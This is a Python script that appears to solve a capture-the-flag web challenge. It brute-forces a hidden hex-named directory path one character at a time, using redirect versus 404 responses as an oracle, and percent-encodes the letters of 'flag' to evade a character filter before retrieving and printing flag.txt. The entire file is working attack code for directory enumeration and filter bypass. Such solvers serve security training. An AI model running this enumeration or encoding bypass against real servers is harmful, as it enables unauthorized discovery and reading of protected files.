import argparse
import logging
import urllib.request
import urllib.parse
from urllib.error import URLError


class RedirHandler(urllib.request.HTTPRedirectHandler):
    """Handler for disable redirection"""

    def redirect_request(self, req, fp, code, msg, hdrs, newurl):
        # check HTTPError
        super().redirect_request(req, fp, code, msg, hdrs, newurl)
        # Ignore new request and stop redirection
        return None


def try_request(base_url: str, path: str) -> bool:
    """Check if the path exists"""

    url = base_url + path
    while True:
        try:
            urllib.request.urlopen(url, timeout=1)
            return True
        except URLError as e:
            if not hasattr(e, "code"):
                logging.warning("URL error: %s", e.reason)
                continue
            # Redirection occured, which means that
            # the path exists but it is not the regular file (but directory).
            if 300 <= e.code and e.code < 400:
                return True
            if e.code != 404:
                logging.warning("URL error: %s", e.reason)
            return False
        except Exception as e:
            logging.warning("Error %s", e)


def encode(c: str) -> str:
    """Avoid forbidden characters (f,l,a,g)"""

    if c in "flag":
        return f"%{ord(c):x}"
    else:
        return c


def main():
    logging.basicConfig(level="DEBUG")

    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:3000", help="Target server url")
    args = parser.parse_args()

    base_url = args.url

    opener = urllib.request.build_opener(RedirHandler)
    urllib.request.install_opener(opener)

    path = "/"
    for i in range(32):
        for x in range(16):
            c = f"{x:x}"
            p = path + encode(c)
            logging.debug("Trying %s", p)
            if try_request(base_url, p):
                path = p + "/"
                break
    for c in "flag.txt":
        path += encode(c) + "/"
    path = path[:-1]  # remove trailing "/"

    decoded_path = urllib.parse.unquote(path)
    print(f"Flag path: {decoded_path}")
    resp = urllib.request.urlopen(base_url + path)
    assert resp.status == 200
    flag = resp.read().decode().strip()
    print(f"Flag: {flag}")


if __name__ == "__main__":
    main()
